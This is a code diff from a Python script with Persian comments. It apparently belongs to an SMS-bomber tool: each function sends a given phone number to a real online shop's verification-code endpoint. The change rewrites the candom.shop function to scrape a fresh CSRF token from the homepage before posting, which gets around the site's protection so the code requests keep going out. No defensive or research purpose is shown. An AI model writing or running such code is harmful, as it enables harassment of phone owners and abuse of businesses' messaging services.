@@ -2705,43 +2705,62 @@ def missomister(phone):
 
 
 def candom_shop(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://candom.shop/bakala/ajax/send_code/"
-    
-    payload = {
-        "action": "bakala_send_code",
-        "phone_email": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-CSRF-TOKEN": "7aae5b22e1",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://candom.shop",
-        "Referer": "https://candom.shop/",
-    }
-    
+
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
+        # پاکسازی شماره
+        if phone.startswith('+98'):
+            formatted_phone = "0" + phone[3:]
+        elif phone.startswith('98'):
+            formatted_phone = "0" + phone[2:]
+        else:
+            formatted_phone = phone
+
+        # مرحله 1: دریافت CSRF token از صفحه اصلی
+        url_main = "https://candom.shop/"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+        }
+        resp = requests.get(url_main, headers=headers, timeout=10)
+        if resp.status_code != 200:
+            print(f"[-] Candom Shop: خطا در دریافت صفحه اصلی ({resp.status_code})")
+            return False
+
+        soup = BeautifulSoup(resp.text, "html.parser")
+        token_tag = soup.find("meta", attrs={"name": "csrf-token"})
+        if not token_tag:
+            print("[-] Candom Shop: دریافت توکن ناموفق بود")
+            return False
+        csrf_token = token_tag["content"]
+
+        # مرحله 2: ارسال درخواست POST
+        post_url = "https://candom.shop/bakala/ajax/send_code/"
+        payload = {
+            "action": "bakala_send_code",
+            "phone_email": formatted_phone
+        }
+        headers_post = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-CSRF-TOKEN": csrf_token,
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://candom.shop",
+            "Referer": "https://candom.shop/",
+        }
+
+        response = requests.post(post_url, data=payload, headers=headers_post, timeout=10)
         if response.status_code == 200:
-            print(f'{g}(candom_shop) {a}Code Sent')
+            print(f"[+] Candom Shop: کد ارسال شد ({formatted_phone})")
             return True
         else:
-            print(f'{r}[-] (candom_shop) HTTP Error: {response.status_code}{a}')
+            print(f"[-] Candom Shop: خطا - کد وضعیت {response.status_code}")
             return False
-            
+
     except Exception as e:
-        print(f'{r}[!] candom_shop Exception: {e}{a}')
+        print(f"[!] Candom Shop: خطا - {e}")
         return False
-        
 
 def tapsi_food(phone):
     import requests
